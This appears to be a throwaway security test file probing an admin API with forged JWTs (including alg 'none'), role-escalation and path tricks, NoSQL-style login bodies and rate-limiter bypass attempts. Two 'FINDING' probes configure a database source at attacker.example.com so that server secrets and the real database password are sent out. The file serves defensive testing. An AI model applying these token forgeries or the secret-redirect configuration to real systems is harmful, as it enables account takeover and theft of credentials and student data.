/** Checker A hostile probes (throwaway copy, never in the repo). */
import { test } from "node:test";
import assert from "node:assert/strict";
import { createRequire } from "node:module";
import { SignJWT } from "jose";
import { adminIdOf } from "../src/admin-routes.js";
import { createPostgresTestPort } from "../src/admin-routes.js";
import { mintVoiceToken, mintAnonymousVoiceToken } from "../src/voice.js";
import { addPartner, createPartnerRegistry } from "../src/partners.js";
import { ADMIN_EMAILS, ADMIN_PATH, JWT_SECRET, JWT_SECRET_TEXT, MASTER_KEY, PASSWORD, PEPPER, T0, adminWorld, fakeGithub, fakePostgres } from "./admin-fixtures.js";

const enc = (s: string) => new TextEncoder().encode(s);
const P = ADMIN_PATH;

async function forge(claims: Record<string, unknown>, opts: { alg?: string; secret?: Uint8Array; exp?: number | null; sub?: string | null; nbf?: number } = {}) {
  const iat = Math.floor(T0 / 1000);
  let j = new SignJWT({ ...claims }).setProtectedHeader({ alg: opts.alg ?? "HS256" }).setIssuedAt(iat);
  if (opts.sub !== null) j = j.setSubject(opts.sub ?? ADMIN_EMAILS["super-admin"]);
  if (opts.exp !== null) j = j.setExpirationTime(opts.exp ?? iat + 3600);
  if (opts.nbf) j = j.setNotBefore(opts.nbf);
  return j.sign(opts.secret ?? JWT_SECRET);
}

test("T1 control: a real super-admin token works", async () => {
  const w = await adminWorld();
  const r = await w.call("GET", `${P}me`, { token: await w.token("super-admin") });
  assert.equal(r.status, 200);
});

test("T1 hostile token matrix: every forged token is a 401 on GET me and POST admins", async () => {
  const w = await adminWorld();
  const iat = Math.floor(T0 / 1000);
  const unsecured = (payload: object) => {
    const b = (o: object) => Buffer.from(JSON.stringify(o)).toString("base64url");
    return `${b({ alg: "none", typ: "JWT" })}.${b(payload)}.`;
  };
  const voiceCtx = { tenantId: "pathlynks", studentId: "s-1", minor: false, guardianConsent: true } as never;
  const cases: Record<string, string> = {
    "no typ, same secret": await forge({ role: "super-admin" }),
    "typ trailing space": await forge({ role: "super-admin", typ: "vc-admin " }),
    "typ upper case": await forge({ role: "super-admin", typ: "VC-ADMIN" }),
    "typ array": await forge({ role: "super-admin", typ: ["vc-admin"] }),
    "typ ok other secret": await forge({ role: "super-admin", typ: "vc-admin" }, { secret: enc("another-secret-".padEnd(48, "z")) }),
    "typ ok alg HS512 same secret": await forge({ role: "super-admin", typ: "vc-admin" }, { alg: "HS512" }),
    "alg none": unsecured({ sub: ADMIN_EMAILS["super-admin"], role: "super-admin", typ: "vc-admin", exp: iat + 3600 }),
    "alg none empty sig stripped dot": unsecured({ sub: ADMIN_EMAILS["super-admin"], role: "super-admin", typ: "vc-admin", exp: iat + 3600 }).slice(0, -1),
    "expired 1s ago": await forge({ role: "super-admin", typ: "vc-admin" }, { exp: iat - 1 }),
    "no exp": await forge({ role: "super-admin", typ: "vc-admin" }, { exp: null }),
    "no sub": await forge({ role: "super-admin", typ: "vc-admin" }, { sub: null }),
    "nbf in future": await forge({ role: "super-admin", typ: "vc-admin" }, { nbf: iat + 600 }),
    "unknown role": await forge({ role: "root", typ: "vc-admin" }),
    "sub not a user": await forge({ role: "super-admin", typ: "vc-admin" }, { sub: "ghost@vc.test" }),
    "voice ticket signed with the ADMIN secret (worst case: equal secrets)": (await mintVoiceToken(JWT_SECRET, voiceCtx, "thread-1", T0)).token,
    "anonymous voice ticket, same secret": (await mintAnonymousVoiceToken(JWT_SECRET, "pathlynks", "https://x.example", "ck", T0)).token,
    "student-like jwt with role claim, same secret": await forge({ role: "super-admin", tenant: "pathlynks", studentId: "s-1" }),
  };
  for (const [name, token] of Object.entries(cases)) {
    for (const [m, p, body] of [["GET", `${P}me`, undefined], ["POST", `${P}admins`, { email: "x@vc.test", password: PASSWORD + "xx", role: "super-admin" }]] as const) {
      const before = w.snapshot();
      const r = await w.call(m, p, { token, ...(body ? { body } : {}) });
      assert.equal(r.status, 401, `${name}: ${m} ${p} -> ${r.status}`);
      assert.equal(w.snapshot(), before, `${name}: no side effect`);
    }
  }
  assert.equal(w.auditRows().length, 0, "unauthenticated calls write no audit rows");
  // header-shape variants of a VALID token
  const good = await w.token("super-admin");
  for (const [name, headers] of Object.entries({
    "lowercase bearer": { authorization: `bearer ${good}` },
    "double space": { authorization: `Bearer  ${good}` },
    "trailing space": { authorization: `Bearer ${good} ` },
    "Basic scheme": { authorization: `Basic ${good}` },
    "cookie only": { cookie: `token=${good}` },
    "x-access-token": { "x-access-token": good },
  } as Record<string, Record<string, string>>)) {
    const r = await w.call("GET", `${P}me`, { headers });
    assert.equal(r.status, 401, name);
  }
  const q = await w.call("GET", `${P}me?token=${good}`);
  assert.equal(q.status, 401, "token in query string");
  const dup = await w.handler({ method: "GET", url: `${P}me`, headers: { authorization: [`Bearer ${good}`, `Bearer ${good}`] as never }, readBody: async () => "" });
  assert.equal(dup.status, 401, "duplicate Authorization header");
});

test("T2 stored role wins over the claim; demotion and disable apply at once", async () => {
  const w = await adminWorld();
  // token claims super-admin for the VIEWER's e-mail
  const lying = await forge({ role: "super-admin", typ: "vc-admin" }, { sub: ADMIN_EMAILS.viewer });
  const r = await w.call("POST", `${P}admins`, { token: lying, body: { email: "evil@vc.test", password: PASSWORD + "xx", role: "super-admin" } });
  assert.equal(r.status, 403);
  assert.equal(await w.store.users.findByEmail("evil@vc.test"), null);
  // disable the admin: its still-valid token is refused
  const adminTok = await w.token("admin");
  assert.equal((await w.call("GET", `${P}me`, { token: adminTok })).status, 200);
  assert.equal(await w.store.users.disable(ADMIN_EMAILS.admin), true);
  assert.equal((await w.call("GET", `${P}me`, { token: adminTok })).status, 401);
  // demote the super-admin to viewer: the existing token loses write power at once
  const sup = await w.token("super-admin");
  await w.store.users.setRole(ADMIN_EMAILS["super-admin"], "viewer");
  assert.equal((await w.call("POST", `${P}admins`, { token: sup, body: { email: "e2@vc.test", password: PASSWORD + "xx", role: "viewer" } })).status, 403);
});

test("T3 role escalation attempts", async () => {
  const w = await adminWorld();
  const viewer = await w.token("viewer");
  const admin = await w.token("admin");
  const sup = await w.token("super-admin");
  const viewerId = adminIdOf(ADMIN_EMAILS.viewer);
  const superId = adminIdOf(ADMIN_EMAILS["super-admin"]);
  const adminId = adminIdOf(ADMIN_EMAILS.admin);
  for (const [name, tok] of [["viewer", viewer], ["admin", admin]] as const) {
    const r = await w.call("PATCH", `${P}admins/${name === "viewer" ? viewerId : adminId}`, { token: tok, body: { role: "super-admin" } });
    assert.equal(r.status, 403, `${name} self-promote`);
    const r2 = await w.call("PATCH", `${P}admins/${viewerId}`, { token: tok, body: { role: "super-admin" } });
    assert.equal(r2.status, 403, `${name} promote other`);
    const r3 = await w.call("POST", `${P}admins`, { token: tok, body: { email: `n-${name}@vc.test`, password: PASSWORD + "xx", role: "super-admin" } });
    assert.equal(r3.status, 403, `${name} create super-admin`);
    const r4 = await w.call("PUT", `${P}sources/gh-1/secret`, { token: tok, body: { secret: "x" } });
    assert.equal(r4.status, 403, `${name} set secret`);
  }
  assert.equal((await w.store.users.findByEmail(ADMIN_EMAILS.viewer))!.role, "viewer");
  assert.equal((await w.store.users.findByEmail(ADMIN_EMAILS.admin))!.role, "admin");
  // super-admin cannot touch itself; bad role strings are 400
  assert.equal((await w.call("PATCH", `${P}admins/${superId}`, { token: sup, body: { role: "viewer" } })).status, 403);
  assert.equal((await w.call("PATCH", `${P}admins/${viewerId}`, { token: sup, body: { role: "root" } })).status, 400);
  assert.equal((await w.call("PATCH", `${P}admins/${viewerId}`, { token: sup, body: { role: "SUPER-ADMIN" } })).status, 400);
  assert.equal((await w.call("PATCH", `${P}admins/${viewerId}`, { token: sup, body: { role: ["admin"] } })).status, 400);
  // id shapes
  for (const id of ["..", "%2e%2e", "super@vc.test", "x".repeat(65), "a b"]) {
    const r = await w.call("PATCH", `${P}admins/${encodeURIComponent(id)}`, { token: sup, body: { role: "admin" } });
    assert.ok([400, 404].includes(r.status), `id ${id} -> ${r.status}`);
  }
  // path tricks around the role gate
  for (const p of [`${P}admins/`, `${P}Admins`, `${P}admins%2F`, `${P}/admins`, `${P}admins;x`]) {
    const r = await w.call("GET", p, { token: viewer });
    assert.ok(r.status === 404 || r.status === 403, `${p} -> ${r.status}`);
    assert.ok(!r.body.includes("@vc.test"), `${p} leaked admins`);
  }
  // method override tricks
  const o = await w.call("GET", `${P}admins`, { token: viewer, headers: { "x-http-method-override": "POST" } });
  assert.equal(o.status, 403);
});

test("T4 login: indistinguishable failures, limiter hostile variants", async () => {
  const w = await adminWorld();
  const login = (email: unknown, password: unknown, ip?: string) =>
    w.call("POST", `${P}login`, { body: { email, password }, headers: ip === undefined ? {} : { "x-real-ip": ip } });
  const a = await login(ADMIN_EMAILS.admin, "wrong-password-xxxx", "10.0.0.91");
  const b = await login("nobody@vc.test", "wrong-password-xxxx", "10.0.0.92");
  assert.equal(a.status, 401);
  assert.equal(b.status, 401);
  assert.equal(a.body, b.body);
  assert.deepEqual(Object.keys(a.headers ?? {}).sort(), Object.keys(b.headers ?? {}).sort());
  // disabled user with the right password: same generic
  await w.store.users.disable(ADMIN_EMAILS.viewer);
  const d = await login(ADMIN_EMAILS.viewer, PASSWORD, "10.0.0.93");
  assert.equal(d.status, 401);
  assert.equal(d.body, a.body);
  // non-string / injection-ish bodies
  let k = 0;
  for (const [e, p] of [[{ $ne: null }, { $ne: null }], [["a"], "x"], [null, null], ["super@vc.test", ["x"]], ["super@vc.test", "x".repeat(300)]] as const) {
    const r = await login(e, p, `10.0.1.${++k}`);
    assert.ok([401, 400].includes(r.status), `body ${JSON.stringify(e)} -> ${r.status}`);
    assert.ok(!r.body.includes("super"));
  }
  // e-mail normalisation variants of the right password
  const w2 = await adminWorld();
  const l2 = (email: string, ip: string) => w2.call("POST", `${P}login`, { body: { email, password: PASSWORD }, headers: { "x-real-ip": ip } });
  const variants: Record<string, number> = {};
  for (const [i, v] of [ADMIN_EMAILS.admin, ADMIN_EMAILS.admin.toUpperCase(), ` ${ADMIN_EMAILS.admin} `, ADMIN_EMAILS.admin + ".", ADMIN_EMAILS.admin.replace("@", "＠"), "admin@vc.test\u0000"].entries()) {
    variants[JSON.stringify(v)] = (await l2(v, `10.1.0.${i + 1}`)).status;
  }
  console.log("T4 email variants (right password):", JSON.stringify(variants));
  // limiter: 5 attempts with DIFFERENT e-mails from one IP, 6th with the RIGHT password -> 429
  const w3 = await adminWorld();
  const l3 = (email: string, pw: string, ip?: string) => w3.call("POST", `${P}login`, { body: { email, password: pw }, headers: ip === undefined ? {} : { "x-real-ip": ip } });
  for (let i = 0; i < 5; i++) assert.equal((await l3(`u${i}@vc.test`, "wrong-wrong-wrong", "203.0.113.5")).status, 401);
  const sixth = await l3(ADMIN_EMAILS["super-admin"], PASSWORD, "203.0.113.5");
  assert.equal(sixth.status, 429);
  assert.ok(Number(sixth.headers["retry-after"]) >= 1);
  assert.ok(!sixth.body.includes("token"));
  // same client by another spelling
  assert.equal((await l3(ADMIN_EMAILS["super-admin"], PASSWORD, "::ffff:203.0.113.5")).status, 429, "v4-mapped spelling shares the bucket");
  assert.equal((await l3(ADMIN_EMAILS["super-admin"], PASSWORD, " 203.0.113.5 ")).status, 429, "whitespace spelling shares the bucket");
  // other client unaffected
  assert.equal((await l3(ADMIN_EMAILS["super-admin"], PASSWORD, "203.0.113.6")).status, 200);
  // no X-Real-IP at all: one shared bucket, still limited
  for (let i = 0; i < 5; i++) await l3(`v${i}@vc.test`, "wrong-wrong-wrong");
  assert.equal((await l3(ADMIN_EMAILS["super-admin"], PASSWORD)).status, 429, "missing client key shares a bucket");
  // window passes -> allowed again
  w3.clock.ms += 61_000;
  assert.equal((await l3(ADMIN_EMAILS["super-admin"], PASSWORD, "203.0.113.5")).status, 200);
  // ipv6 same /64
  const w4 = await adminWorld();
  const l4 = (ip: string) => w4.call("POST", `${P}login`, { body: { email: "x@vc.test", password: "wrong-wrong-wrong" }, headers: { "x-real-ip": ip } });
  for (let i = 0; i < 5; i++) await l4(`2001:db8:1:2::${i + 1}`);
  assert.equal((await l4("2001:db8:1:2:ffff::9")).status, 429, "same /64");
  console.log("T4 audit actors for 429 rows:", JSON.stringify(w3.auditRows().filter((r) => !r.ok).slice(-3)));
});

test("T5 secrets never leak through error paths", async () => {
  const TOKEN = "tok-DUMMY-not-real-9f3a1c";
  const PW = "pw-DUMMY-not-real-77bd02";
  const gh = fakeGithub({}, { failWith: new Error(`upstream said Bearer ${TOKEN} is bad`) });
  const pg = { calls: [], async test() { throw new Error(`password authentication failed for ${PW}`); } } as never;
  const w = await adminWorld({ github: () => gh, postgres: pg, env: { GH_TOKEN_REF: TOKEN, PG_PASSWORD_REF: PW } });
  const sup = await w.token("super-admin");
  await w.store.sources.upsert({ id: "gh-1", siteId: "pathlynks", kind: "github", config: { owner: "acme", repo: "backend", branch: "main", service: "school", tokenRef: "GH_TOKEN_REF" } });
  await w.store.sources.upsert({ id: "pg-1", siteId: "pathlynks", kind: "postgres", config: { host: "db.example.com", port: 5432, database: "d", user: "u", sslmode: "require", passwordRef: "PG_PASSWORD_REF", tables: ["students", "saved_careers", "compare_lists", "assessments"] } });
  const bodies: string[] = [];
  for (const [m, p, body] of [
    ["POST", `${P}sources/gh-1/test`, {}], ["POST", `${P}sources/gh-1/sync`, {}], ["POST", `${P}sources/pg-1/test`, {}], ["POST", `${P}sources/pg-1/sync`, {}],
    ["PUT", `${P}sources/gh-1/secret`, { secret: TOKEN }], ["POST", `${P}sources/gh-1/test`, {}], ["POST", `${P}sources/gh-1/sync`, {}],
    ["GET", `${P}sources`, undefined], ["GET", `${P}audit`, undefined], ["GET", `${P}sites`, undefined], ["GET", `${P}admins`, undefined],
    ["POST", `${P}sources`, { kind: "github", id: "bad", owner: "a", repo: "b", branch: "main", service: "school", note: TOKEN }],
    ["POST", `${P}sources`, { kind: "github", id: "bad2", owner: "a", repo: "b", branch: "main", service: "school", token: TOKEN }],
  ] as const) {
    const r = await w.call(m, p, { token: sup, ...(body ? { body } : {}) });
    bodies.push(`${m} ${p} ${r.status} ${r.body} ${JSON.stringify(r.headers)}`);
  }
  const everything = bodies.join("\n") + JSON.stringify(w.logs) + JSON.stringify(w.auditRows()) + w.snapshot();
  assert.ok(!everything.includes(TOKEN.slice(4)), "token fragment leaked");
  assert.ok(!everything.includes(PW.slice(3)), "password leaked");
  const stored = JSON.stringify(w.fakeDb.collection("sources").all());
  assert.ok(!stored.includes(TOKEN), "plaintext secret in the sources collection");
  assert.ok(!everything.includes(JWT_SECRET_TEXT) && !everything.includes(MASTER_KEY));
  console.log("T5 statuses:", bodies.map((b) => b.split(" ").slice(0, 3).join(" ")).join(" | "));
});

test("T6 FINDING probe: an ADMIN (not super-admin) points a Postgres source at its own host with passwordRef = a server env var, then Test", async () => {
  const SERVER_SECRET = "SERVER-ENV-SECRET-DUMMY-4d1e";
  const req = createRequire("D:/vc/.worktrees/vca-int/mcp/pathlynks/package.json");
  const pg = req("pg");
  const seen: { host?: string; password?: string }[] = [];
  const orig = pg.Client.prototype.connect;
  pg.Client.prototype.connect = async function (this: { connectionParameters: { host: string; password: string } }) {
    seen.push({ host: this.connectionParameters.host, password: this.connectionParameters.password });
    throw new Error("stubbed connect");
  };
  try {
    const env = { VC_ADMIN_JWT_SECRET: SERVER_SECRET, PATHLYNKS_DB_PASSWORD: "legit" };
    const w = await adminWorld({ env, postgres: createPostgresTestPort({ env }) });
    const admin = await w.token("admin");
    const create = await w.call("POST", `${P}sources`, {
      token: admin,
      body: { kind: "postgres", id: "evil-db", host: "attacker.example.com", port: 5432, database: "x", user: "u", sslmode: "require", passwordRef: "VC_ADMIN_JWT_SECRET", tables: ["students", "saved_careers", "compare_lists", "assessments"] },
    });
    console.log("T6 create status", create.status, create.body.slice(0, 120));
    const test = await w.call("POST", `${P}sources/evil-db/test`, { token: admin, body: {} });
    console.log("T6 test status", test.status, test.body);
    console.log("T6 pg.Client saw host:", seen.map((s) => s.host), "password equals server env secret:", seen.map((s) => s.password === SERVER_SECRET));
    // GitHub variant: tokenRef -> any env var is sent as a Bearer token to the GitHub port
    let tokenSeen: string | undefined;
    const w2 = await adminWorld({ env, github: (t) => { tokenSeen = t; return fakeGithub({}); } });
    const admin2 = await w2.token("admin");
    await w2.call("POST", `${P}sources`, { token: admin2, body: { kind: "github", id: "evil-gh", owner: "a", repo: "b", branch: "main", service: "school", tokenRef: "VC_ADMIN_JWT_SECRET" } });
    await w2.call("POST", `${P}sources/evil-gh/test`, { token: admin2, body: {} });
    console.log("T6 github port token equals server env secret:", tokenSeen === SERVER_SECRET);
  } finally {
    pg.Client.prototype.connect = orig;
  }
});

test("T7 replay: rotated-out key, revoked key, unrevoke does not resurrect a rotated-out key", async () => {
  const w = await adminWorld();
  const admin = await w.token("admin");
  const created = await w.call("POST", `${P}sites`, { token: admin, body: { name: "Replay Site", origins: ["https://r.example"] } });
  const oldPub = created.json.keys.pub as string;
  const reg = createPartnerRegistry({ store: w.partnerStore, pepper: PEPPER, nowMs: () => w.clock.ms });
  assert.ok(await reg.authenticate(oldPub, "pub"));
  const rot = await w.call("POST", `${P}sites/replay-site/keys/rotate`, { token: admin, body: { scope: "pub" } });
  w.clock.ms += 61_000;
  assert.equal(await reg.authenticate(oldPub, "pub"), undefined);
  await w.call("POST", `${P}sites/replay-site/revoke`, { token: admin, body: {} });
  await w.call("POST", `${P}sites/replay-site/unrevoke`, { token: admin, body: {} });
  w.clock.ms += 61_000;
  assert.equal(await reg.authenticate(oldPub, "pub"), undefined, "rotated-out key stays dead after revoke+unrevoke");
  assert.ok(await reg.authenticate(rot.json.key, "pub"));
  // the list and the rotate response never carry hashes; a second GET shows only prefix
  const list = await w.call("GET", `${P}sites`, { token: admin });
  assert.ok(!list.body.includes(rot.json.key) && !list.body.includes(oldPub));
  // mass assignment on PATCH sites
  const before = JSON.stringify(await w.partnerStore.get("replay-site"));
  await w.call("PATCH", `${P}sites/replay-site`, { token: admin, body: { name: "Renamed", status: "active", keys: { pub: { hash: "x" } }, partnerId: "other", allowedOrigins: ["http://evil"] } });
  const after = await w.partnerStore.get("replay-site");
  assert.equal(after!.name, "Renamed");
  assert.ok(!JSON.stringify(after).includes("http://evil"));
  assert.equal(after!.partnerId, "replay-site");
  void before;
  // invalid origin variants
  for (const o of ["http://insecure.example", "https://x.example/path", "https://*.example", "https://x.example:99999", "javascript:alert(1)", "https://user:pw@x.example"]) {
    const r = await w.call("PATCH", `${P}sites/replay-site`, { token: admin, body: { origins: [o] } });
    assert.ok(r.status === 400, `origin ${o} -> ${r.status}`);
  }
  // reserved ids
  for (const id of ["pathlynks", "admin", "anonymous", "Pathlynks"]) {
    const r = await w.call("POST", `${P}sites`, { token: admin, body: { name: "x", id } });
    console.log("T7 reserved/own id", id, "->", r.status);
  }
});

test("T8 FINDING probe: an ADMIN-created postgres source with an id that sorts first hijacks the LIVE chat Pathlynks port (host + DB password + student ids go to the attacker host)", async () => {
  const { createLivePathlynksPort, seedSourcesFromConfig } = await import("../src/admin-routes.js");
  const { loadSourcesFile } = await import("@vc/schemas");
  const REAL_DB_PASSWORD = "REAL-PATHLYNKS-DB-PW-DUMMY-5e2";
  const req = createRequire("D:/vc/.worktrees/vca-int/mcp/pathlynks/package.json");
  const pg = req("pg");
  const seen: { host?: string; password?: string }[] = [];
  const orig = pg.Client.prototype.connect;
  pg.Client.prototype.connect = async function (this: { connectionParameters: { host: string; password: string } }) {
    seen.push({ host: this.connectionParameters.host, password: this.connectionParameters.password });
    throw new Error("stubbed connect");
  };
  try {
    const env = { PATHLYNKS_DB_PASSWORD: REAL_DB_PASSWORD };
    const w = await adminWorld({ env });
    await seedSourcesFromConfig(w.store, loadSourcesFile("D:/vc/.worktrees/vca-int/config/sources.json"));
    const admin = await w.token("admin");
    const port = createLivePathlynksPort(w.store, { env, nowMs: () => w.clock.ms });
    await port.getStudentProfile("student-1");
    console.log("T8 before the admin acts, port connects to:", seen.map((s) => s.host));
    seen.length = 0;
    const r = await w.call("POST", `${P}sources`, {
      token: admin,
      body: { kind: "postgres", id: "aaa-evil", host: "attacker.example.com", port: 5432, database: "x", user: "u", sslmode: "require", passwordRef: "PATHLYNKS_DB_PASSWORD", tables: ["students", "saved_careers", "compare_lists", "assessments"] },
    });
    console.log("T8 admin POST sources ->", r.status);
    w.clock.ms += 61_000;
    await port.getStudentProfile("student-1");
    console.log("T8 after, port connects to:", seen.map((s) => s.host), "password is the real DB password:", seen.map((s) => s.password === REAL_DB_PASSWORD));
  } finally {
    pg.Client.prototype.connect = orig;
  }
});
